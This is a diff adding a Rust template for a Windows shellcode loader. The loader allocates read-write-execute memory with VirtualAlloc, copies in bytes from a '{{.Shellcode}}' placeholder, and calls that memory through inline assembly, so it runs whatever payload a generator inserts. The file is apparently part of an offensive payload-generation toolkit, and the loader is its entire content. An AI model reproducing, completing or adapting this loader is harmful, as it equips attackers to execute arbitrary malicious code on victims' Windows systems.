@@ -1,0 +1,33 @@
+use windows::Win32::System::Memory::*;
+use std::arch::asm;
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+pub const MEM_COMMIT: u32 = 0x1000;
+pub const MEM_RESERVE: u32 = 0x2000;
+
+fn main() {
+    let data = &[{{.Shellcode}}];
+    let data_len = data.len();
+
+    let new_buf = unsafe {
+        VirtualAlloc(
+            None,
+            data_len,
+            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE),
+            PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE),
+        )
+    };
+    if new_buf == std::ptr::null_mut() {
+        return;
+    }
+
+    let new_buf_ptr: *mut u8 = new_buf as *mut u8 as _;
+    
+    unsafe { std::ptr::copy_nonoverlapping(data.as_ptr(), new_buf_ptr, data_len) };
+    
+    unsafe {
+        let jmp_target = new_buf;
+        asm!(
+            "call {}",in(reg) jmp_target
+            )
+    };
+}
